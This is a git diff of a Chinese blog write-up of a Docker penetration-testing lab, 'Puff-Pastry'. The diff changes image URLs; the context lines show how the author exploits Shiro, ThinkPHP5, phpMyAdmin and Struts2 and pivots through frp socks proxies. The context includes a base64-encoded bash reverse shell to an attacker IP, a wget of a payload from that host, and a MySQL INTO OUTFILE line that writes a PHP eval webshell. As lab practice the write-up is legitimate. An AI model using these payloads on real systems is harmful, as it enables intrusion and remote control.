@@ -12,21 +12,21 @@ draft: "false"
 # Puff-Pastry打靶记录
 ## 搭建
 使用docker搭建,然后本地能够访问到一个8080端口
-![|207](https://img.l1uyun.one/Puff-Pastry打靶记录_image_1.png)
+![|207](https://img.l1uyun.top/Puff-Pastry打靶记录_image_1.png)
 这里我最开始是使用的Windows docker,后面改成了使用虚拟机
 ## shiro
 ### 探测
 java后端
-![|522](https://img.l1uyun.one/Puff-Pastry打靶记录_image_2.png)
+![|522](https://img.l1uyun.top/Puff-Pastry打靶记录_image_2.png)
 进去只有一个登录框,在搭建过程中已经知道了第一台机器是shiro,选择记住密码,登录
 
 这里出现了shiro的特征 Cookie中存在rememberme字段
-![|453](https://img.l1uyun.one/Puff-Pastry打靶记录_image_3.png)
+![|453](https://img.l1uyun.top/Puff-Pastry打靶记录_image_3.png)
 ### shiro利用
 直接上利用工具
 
 获取flag
-![](https://img.l1uyun.one/Puff-Pastry打靶记录_image_4.png)
+![](https://img.l1uyun.top/Puff-Pastry打靶记录_image_4.png)
 
 拿一个反弹shell
 ```bash
@@ -103,7 +103,7 @@ plesa try other path,as -path /www/wwwroot/index.php
 192.168.100.3 thinkphp
 ```
 现在的网络环境为
-![|600](https://img.l1uyun.one/Puff-Pastry打靶记录_image_5.png)
+![|600](https://img.l1uyun.top/Puff-Pastry打靶记录_image_5.png)
 
 接下来需要配置端口转发了,这个我没啥经验,用我wsl里面装过的frp吧
 ```bash
@@ -144,15 +144,15 @@ localPort = 80
 remotePort = 9999
 ```
 
-![](https://img.l1uyun.one/Puff-Pastry打靶记录_image_6.png)
+![](https://img.l1uyun.top/Puff-Pastry打靶记录_image_6.png)
 ## thinkphp
-![|486](https://img.l1uyun.one/Puff-Pastry打靶记录_image_7.png)
+![|486](https://img.l1uyun.top/Puff-Pastry打靶记录_image_7.png)
 
 网站主页提示了是thinkphp5,直接找到相关工具开始利用
 
 ### 利用
 检测漏洞
-![](https://img.l1uyun.one/Puff-Pastry打靶记录_image_8.png)
+![](https://img.l1uyun.top/Puff-Pastry打靶记录_image_8.png)
 拿shell
 ```bash
 echo 'YmFzaCAtaSA1PD4vZGV2L3RjcC8xOTIuMTY4LjEyMi4xMDIvNDQ0NCAwPiY1IDE+JjUK' |base64 -d > /tmp/a.sh
@@ -161,7 +161,7 @@ ls -al /tmp/a.sh
 bash /tmp/a.sh
 ```
 但是这个shell好像弹不回来..换成php的试试
-![](https://img.l1uyun.one/Puff-Pastry打靶记录_image_9.png)
+![](https://img.l1uyun.top/Puff-Pastry打靶记录_image_9.png)
 成功拿到shell
 ```bash
 wget 192.168.122.102/ppp -O /tmp/ppp
@@ -286,7 +286,7 @@ plesa try other path,as -path /www/wwwroot/index.php
 10.85.101.1 ???  是运行docker的parrot???
 ```
 现在的环境为
-![](https://img.l1uyun.one/Puff-Pastry打靶记录_image_10.png)
+![](https://img.l1uyun.top/Puff-Pastry打靶记录_image_10.png)
 这里就直接配置个socks代理吧
 ```toml
 serverAddr = "192.168.122.102"
@@ -301,9 +301,9 @@ type = "socks5"
 ```
 
 配完之后
-![](https://img.l1uyun.one/Puff-Pastry打靶记录_image_11.png)
+![](https://img.l1uyun.top/Puff-Pastry打靶记录_image_11.png)
 配置一下proxychains
-![](https://img.l1uyun.one/Puff-Pastry打靶记录_image_12.png)
+![](https://img.l1uyun.top/Puff-Pastry打靶记录_image_12.png)
 ## redis
 使用proxychains来实现使用代理
 ```bash
@@ -351,40 +351,40 @@ PONG
 ```
 localhost:root:root
 ```
-![](https://img.l1uyun.one/Puff-Pastry打靶记录_image_13.png)
+![](https://img.l1uyun.top/Puff-Pastry打靶记录_image_13.png)
 
 但是我进不去....
-![](https://img.l1uyun.one/Puff-Pastry打靶记录_image_14.png)
+![](https://img.l1uyun.top/Puff-Pastry打靶记录_image_14.png)
 重试了几遍,进去了
 
 拿到flag
-![](https://img.l1uyun.one/Puff-Pastry打靶记录_image_15.png)
+![](https://img.l1uyun.top/Puff-Pastry打靶记录_image_15.png)
 ### into-outfile写入webshell
 尝试利用,这里去找了一下文章,[PHPMyadmin-Mysql的Getshell姿势汇总 – 张三blog](https://www.zsblog.org/390.html)
 先看看有没有权限写入文件,这里设置为空,没有限制
-![](https://img.l1uyun.one/Puff-Pastry打靶记录_image_16.png)
+![](https://img.l1uyun.top/Puff-Pastry打靶记录_image_16.png)
 这俩没啥用,直接猜是/var/www/html试试
-![](https://img.l1uyun.one/Puff-Pastry打靶记录_image_17.png) ![](https://img.l1uyun.one/Puff-Pastry打靶记录_image_18.png)
+![](https://img.l1uyun.top/Puff-Pastry打靶记录_image_17.png) ![](https://img.l1uyun.top/Puff-Pastry打靶记录_image_18.png)
 写入webshell
 ```sql
 select "<?php @eval($_POST[1]);?>" into outfile '/var/www/html/shell.php'
 ```
-![](https://img.l1uyun.one/Puff-Pastry打靶记录_image_19.png)
+![](https://img.l1uyun.top/Puff-Pastry打靶记录_image_19.png)
 获取一个webshell
-![](https://img.l1uyun.one/Puff-Pastry打靶记录_image_20.png)
+![](https://img.l1uyun.top/Puff-Pastry打靶记录_image_20.png)
 
 这个机器好像不出网....尝试了几种payload,都拿不到shell,也不同wget访问我的攻击机.
 ### 蚁剑
 网上搜了一下,看到有不出网环境下使用蚁剑的例子.
 
 用蚁剑看看
-![](https://img.l1uyun.one/Puff-Pastry打靶记录_image_21.png)
+![](https://img.l1uyun.top/Puff-Pastry打靶记录_image_21.png)
 拿到这个flag
-![](https://img.l1uyun.one/Puff-Pastry打靶记录_image_22.png)
+![](https://img.l1uyun.top/Puff-Pastry打靶记录_image_22.png)
 使用蚁剑的终端,来尝试反弹shell,但是还是不行,这好像是个不出网的环境...
-![](https://img.l1uyun.one/Puff-Pastry打靶记录_image_23.png)
+![](https://img.l1uyun.top/Puff-Pastry打靶记录_image_23.png)
 不过蚁剑带的文件上传功能能用
-![](https://img.l1uyun.one/Puff-Pastry打靶记录_image_24.png)
+![](https://img.l1uyun.top/Puff-Pastry打靶记录_image_24.png)
 ### 内网扫描
 ```bash
 (root:/tmp) $ ip a
@@ -403,7 +403,7 @@ select "<?php @eval($_POST[1]);?>" into outfile '/var/www/html/shell.php'
 ```
 
 执行fscan之后,没有回显,但是有输出文件
-![](https://img.l1uyun.one/Puff-Pastry打靶记录_image_25.png)
+![](https://img.l1uyun.top/Puff-Pastry打靶记录_image_25.png)
 跟之前一样,多了一个172.56.102.1,这到底是啥???🤔,大概率就是我运行docker的parrot机器了
 ```bash
 172.56.102.1:22 open
@@ -433,7 +433,7 @@ Access denied.
 172.56.102.2   struts2
 ```
 这里直接拿巨魔的拓扑图
-![](https://img.l1uyun.one/Puff-Pastry打靶记录_image_26.png)
+![](https://img.l1uyun.top/Puff-Pastry打靶记录_image_26.png)
 我现在需要再配置一个socks代理,服务器放在thinkphp机器上,客户端放在phpmyadmin机器上
 ```toml
 phpmyadmin.toml
@@ -448,7 +448,7 @@ remotePort = 9998
 [proxies.plugin]
 type = "socks5"
 ```
-![](https://img.l1uyun.one/Puff-Pastry打靶记录_image_27.png)
+![](https://img.l1uyun.top/Puff-Pastry打靶记录_image_27.png)
 然后在proxychains里面配置两个代理
 ```bash
 socks5 192.168.122.102 9998
@@ -474,16 +474,16 @@ PORT     STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 1.89 seconds
 ```
 代理成功了,接下来需要在Windows上面也使用多重代理,这时候要上proxifier了.
-![](https://img.l1uyun.one/Puff-Pastry打靶记录_image_28.png)
+![](https://img.l1uyun.top/Puff-Pastry打靶记录_image_28.png)
 配置完之后,成功访问Struts服务器.
-![](https://img.l1uyun.one/Puff-Pastry打靶记录_image_29.png)
+![](https://img.l1uyun.top/Puff-Pastry打靶记录_image_29.png)
 ## Struts
 漏洞存在
-![](https://img.l1uyun.one/Puff-Pastry打靶记录_image_30.png)
+![](https://img.l1uyun.top/Puff-Pastry打靶记录_image_30.png)
 执行命令
-![](https://img.l1uyun.one/Puff-Pastry打靶记录_image_31.png)
+![](https://img.l1uyun.top/Puff-Pastry打靶记录_image_31.png)
 获取flag
-![](https://img.l1uyun.one/Puff-Pastry打靶记录_image_32.png)
+![](https://img.l1uyun.top/Puff-Pastry打靶记录_image_32.png)
 
 ## Postgres
 之前fscan扫出来的弱口令
